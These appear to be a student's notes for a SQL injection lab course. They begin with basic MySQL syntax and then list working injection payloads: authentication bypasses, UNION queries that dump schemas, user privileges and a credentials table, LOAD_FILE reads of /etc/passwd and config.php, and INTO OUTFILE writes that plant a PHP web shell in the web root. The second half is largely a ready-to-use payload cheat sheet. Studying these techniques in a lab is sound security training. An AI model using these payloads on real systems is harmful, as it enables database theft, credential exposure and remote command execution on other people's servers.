Database/Tables
mysql -u root -h docker.example.com -P 3306 -p
CREATE DATABASE users;
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

SHOW databases;
USE database_name;
SHOW TABLES;

INSERT Statement
	INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
SELECT Statement
	SELECT * FROM logins;
DROP Statement
	DROP TABLE logins;
ALTER Statement
	ALTER TABLE logins ADD newColumn INT;
	ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
	ALTER TABLE logins MODIFY oldColumn DATE;
	ALTER TABLE logins DROP oldColumn;
UPDATE Statement
	UPDATE logins SET password = 'change_password' WHERE id > 1;
Sorting Results
	SELECT * FROM logins ORDER BY password;
	SELECT * FROM logins ORDER BY password DESC;
	SELECT * FROM logins ORDER BY password DESC, id ASC;
LIMIT results
	SELECT * FROM logins LIMIT 2;
	SELECT * FROM logins LIMIT 1, 2;
WHERE Clause
	SELECT * FROM logins WHERE id > 1;
	SELECT * FROM logins where username = 'admin';
	SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
	SELECT COUNT(*) FROM employees.titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%'; <-----
LIKE Clause
	SELECT * FROM logins WHERE username LIKE 'admin%';
	SELECT * FROM logins WHERE username like '___';
AND Operator
	SELECT 1 = 1 AND 'test' = 'test';
	SELECT 1 = 1 OR 'test' = 'abc';
	SELECT 1 = 2 OR 'test' = 'abc';
NOT Operator
	SELECT NOT 1 = 1;
	SELECT NOT 1 = 2;
Symbol Operators
	SELECT 1 = 1 && 'test' = 'abc';
	SELECT 1 = 1 || 'test' = 'abc';
	SELECT 1 != 1;
Operators in queries
	SELECT * FROM logins WHERE username != 'john';
	SELECT * FROM logins WHERE username != 'john' AND id > 1;
Multiple Operator Precedence
	select * from logins where username != 'tom' AND id > 3 - 2;

SQLi Discovery
' 	%27
" 	%22
# 	%23
; 	%3B
) 	%29

*******Auth Bypass******
admin' or '1'='1
admin')-- -
tom' or '1'='1
'or id=5)#
admin 'OR 1=1#
admin' or '1'='1'-- -


https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

Comments
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';

Union clause
SELECT * FROM ports UNION SELECT * FROM ships;
Even Columns
SELECT city FROM ports UNION SELECT * FROM ships;
Un-even Columns
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

	use employees;
	show tables;
	select * from employees;  (emp_no,birth_date,first_name,last_name,gender,hire_date)
	select * from departments; (dept_no, dept_name)
	SELECT emp_no,birth_date,first_name,last_name,gender,hire_date FROM employees UNION SELECT dept_no, dept_name,1,1,1,1 FROM departments--;


Detect number of columns
If we failed at order by 4, this means the table has three columns

Union Injection:
' order by 1-- -
' order by 2-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
cn' UNION select 1,@@version,3,4-- -

INFORMATION_SCHEMA
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
SELECT @@version
SELECT SLEEP(5)

TABLES
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

COLUMNS
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -

DB User
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

User Privileges
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

LOAD_FILE
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

Write File Privileges
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

SELECT INTO OUTFILE
SELECT * from users INTO OUTFILE '/tmp/credentials';

Writing Files through SQL Injection
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

\System32\Inetsrv\Config\ApplicationHost.config

Writing a Web Shell
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
IP/shell.php?0=id


****Skills assessment***
SQLi Discovery
Auth Bypass

' UNION SELECT 1,USER(),3,4,5-- -
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/proof.txt'-- -
' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
IP/shell.php?0=id
' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
' union select "",'<?php system(pwd); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -
' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
' UNION SELECT 1,LOAD_FILE("/flag.txt"),3,4,5-- -
*************************


/etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
